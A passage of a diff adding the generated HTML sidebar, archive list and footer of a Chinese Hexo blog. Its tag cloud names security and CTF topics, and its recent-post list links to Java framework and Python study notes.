style="font-size: 10px;">python</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 20px;">sql注入</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">上传漏洞</a> <a href="/tags/%E4%BC%AA%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">伪加密</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">暴力破解</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 10px;">杂项</a> <a href="/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/" style="font-size: 10px;">盲水印</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size: 10px;">隐写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/01/20/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/20/Java%20EE%E2%80%94%E2%80%94Mybatis%20%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/">Mybatis框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/03/Java%20EE%E2%80%94%E2%80%94SpringMVC%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/">SpringMVC框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/05/%E5%8D%8E%E4%B8%BA%E9%B2%B2%E9%B9%8F%E4%BA%91HCIA%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/">华为鲲鹏云HCIA知识总结（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">Python学习笔记（一）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 未完成的歌<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
